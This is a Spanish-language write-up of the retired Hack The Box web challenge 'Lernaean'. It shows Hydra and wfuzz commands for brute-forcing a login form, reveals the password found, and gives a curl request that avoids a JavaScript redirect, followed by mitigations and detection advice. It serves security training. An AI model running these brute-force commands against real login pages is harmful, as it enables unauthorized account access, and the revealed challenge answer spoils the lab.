---
challenge: Lernaean
category: Challenge
type: Web
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, hydra, brute-force, client-side, php]
---

# Lernaean — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired según el índice histórico de retos y writeups públicos; no comprobado con sesión en HTB.
> Sin flags reales.

## TL;DR

Un formulario de login con la pista "Try and guess their password". El nombre del reto apunta a la Hidra de Lerna: se fuerza el `POST` con **Hydra** y aparece la contraseña `leonardo`. El navegador redirige a `noooooooope.html` mediante JavaScript, pero la respuesta original del `POST` ya contiene la marca; con `curl` no se ejecuta el redirect y se lee el cuerpo.

## Enunciado y superficie

- Categoría **Web**, dificultad **Easy**.
- Una única página con un formulario de usuario y contraseña.
- La pista invita a probar contraseñas; no hay registro ni recuperación.
- El reto se sirve en un contenedor con host y puerto propios (`<HOST>:<PORT>`).

## Reconocimiento

```bash
curl -s -i http://<HOST>:<PORT>/ | head -40
curl -s http://<HOST>:<PORT>/ | grep -iE 'form|input|script|hint'
```

El HTML muestra un `POST` a `index.php` con los campos `username` y `password`. La página de error devuelve `Invalid password!`; ese texto es la condición de fallo para Hydra. No hay CSRF token ni rate limit visible.

```bash
curl -s -X POST http://<HOST>:<PORT>/ \
  -d 'username=user&password=test' | tail -20
```

## Explicación del fallo

La aplicación valida la contraseña en el servidor, pero no limita los intentos. Además, la "protección" contra la fuerza bruta es **JavaScript en el cliente**: si la contraseña es correcta, el script redirige a `noooooooope.html` ("Too slow!"). El servidor ya ha devuelto la respuesta con la marca antes de que el navegador ejecute el redirect. Un cliente que no ejecute JavaScript, como `curl`, ve el cuerpo original.

No es un bypass criptográfico: es una comprobación de cliente sobre una respuesta que ya salió del servidor.

## Explotación

### Hydra

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt \
  -s <PORT> <HOST> http-post-form \
  "/index.php:username=^USER^&password=^PASS^:Invalid password!"
```

Si el usuario no se conoce, se prueba con `admin` o se deja que el formulario lo valide; en el reto original la cuenta es `user`. Hydra encuentra la contraseña `leonardo`.

Alternativa con `wfuzz`:

```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
  -d 'username=user&password=FUZZ' --hw=<WORDS> \
  http://<HOST>:<PORT>/index.php
```

`--hw` filtra por número de palabras de la respuesta de fallo; hay que medirlo antes con una petición inválida.

### Evitar el redirect de cliente

```bash
curl -s -X POST http://<HOST>:<PORT>/ \
  -d 'username=user&password=leonardo'
```

La respuesta contiene la marca del reto. Si se usa el navegador, el JavaScript redirige a `noooooooope.html`; basta con deshabilitar JavaScript, interceptar la respuesta o repetir la petición con `curl`.

No se publica la flag: el objetivo es demostrar el método y eludir la comprobación de cliente.

## Evidencia

- Formulario y texto de error `Invalid password!`.
- Hydra con la contraseña encontrada.
- `curl` mostrando el cuerpo del `POST` correcto.
- Redirección de cliente a `noooooooope.html`, sin flag.

## Lecciones aprendidas

- Una redirección en JavaScript no es un control de acceso: la respuesta ya está en el cliente.
- El texto de error es la condición de Hydra; sin él hay que usar un filtro por tamaño o código.
- `rockyou` sigue siendo suficiente para contraseñas de retos antiguos, pero el método importa más que la lista.
- La pista del nombre ("Lernaean Hydra") es parte del reto: identifica la herramienta.
- Un rate limit en el servidor habría cambiado el ataque; un redirect en el cliente no.

## Mitigaciones y detección

- Limitar intentos por cuenta e IP, con backoff y bloqueo temporal; no confiar en JavaScript para la seguridad.
- Devolver un error genérico y no incluir la marca ni datos sensibles en la respuesta antes de la autorización.
- Registrar fallos de autenticación y alertar de ráfagas (por ejemplo, 401/403 repetidos o `POST` masivos a `index.php`).
- Usar contraseñas fuertes y MFA; el brute force deja de ser suficiente.
- MITRE: T1110.001 (password guessing), T1110.003 (password spraying) como variante.
- Referencias: writeups de sequr.be y Bug Decoder; documentación de Hydra.

## Referencias

- <https://sequr.be/blog/2019/08/lernaean>
- <https://medium.com/bugdecoder/htb-lernaean-web-challenge-write-up-2994c7ba7244>
- <https://jebidiah-anthony.github.io/chals/htb/challenges.html>
